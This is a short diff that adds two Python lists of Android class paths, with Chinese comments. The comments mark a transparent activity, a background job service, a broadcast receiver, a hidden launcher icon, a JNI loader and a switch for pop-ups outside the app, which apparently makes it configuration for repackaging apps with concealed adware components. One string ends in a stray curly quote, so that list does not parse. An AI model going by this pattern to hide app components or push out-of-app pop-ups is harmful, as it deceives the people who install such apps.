@@ -1,0 +1,20 @@
+
+['', '',  # 包名
+               'com.flying.grass.seen.uican.UiCanActivity',# 透明activity
+               'com.flying.grass.seen.zztw.sercan.TxtNiSS', # JobSchedulerService
+               'com/flying/grass/seen/zztw/rcango/TxtNiMR',  #  广播
+               '', 'com.blissfuldrinkingwater.goodhealth.dwr.MainActivity',  # 隐藏图标 other1","main2
+               'com/flying/grass/seen/zload/TxtLoad', '"txtLoad"',# jni路径及函数
+              '/fzoret']  # 外弹文件开关名
+
+
+
+
+
+
+['com.blissfuldrinkingwater.goodhealth.dwr', 'com.water.note.mate.fresh.leaf',  # 包名
+                'com/flying/grass/seen/zload/NtLoad’,
+                '"txtTheme"','"abbrevArmy"', '"hfcanLast"',
+                'com/flying/grass/seen/zhshow/Fces7t',  # hander
+                'com/flying/grass/seen/zhshow/Wjksshow',  # WccClass
+                '/fzoret']#文件开关
